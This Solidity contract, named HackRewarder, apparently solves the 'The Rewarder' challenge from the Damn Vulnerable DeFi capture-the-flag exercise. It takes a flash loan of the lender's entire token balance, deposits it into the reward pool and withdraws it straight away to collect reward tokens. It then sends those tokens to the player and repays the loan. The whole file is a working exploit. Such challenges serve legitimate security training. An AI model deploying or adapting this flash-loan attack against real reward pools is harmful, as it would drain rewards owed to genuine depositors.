// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import {FlashLoanerPool} from "../the-rewarder/FlashLoanerPool.sol";
import {TheRewarderPool} from "../the-rewarder/TheRewarderPool.sol";
import {RewardToken} from "../the-rewarder/RewardToken.sol";
import {DamnValuableToken, ERC20} from "../DamnValuableToken.sol";

contract HackRewarder {
    address _player;
    FlashLoanerPool _lender;
    TheRewarderPool _pool;
    DamnValuableToken _liquidityToken;
    RewardToken _rewardToken;

    constructor(
        FlashLoanerPool lender_,
        TheRewarderPool pool_,
        DamnValuableToken liquidityToken_,
        RewardToken rewardToken_
    ) {
        _player = msg.sender;
        _lender = lender_;
        _pool = pool_;
        _liquidityToken = liquidityToken_;
        _rewardToken = rewardToken_;
    }

    function attack() external {
        _lender.flashLoan(_liquidityToken.balanceOf(address(_lender)));
    }

    function receiveFlashLoan(uint256 amount) external {
        require(tx.origin == _player);
        require(msg.sender == address(_lender));

        _liquidityToken.approve(address(_pool), amount);
        _pool.deposit(amount);
        _pool.withdraw(amount);

        _rewardToken.transfer(_player, _rewardToken.balanceOf(address(this)));

        _liquidityToken.transfer(address(msg.sender), amount);
    }
}
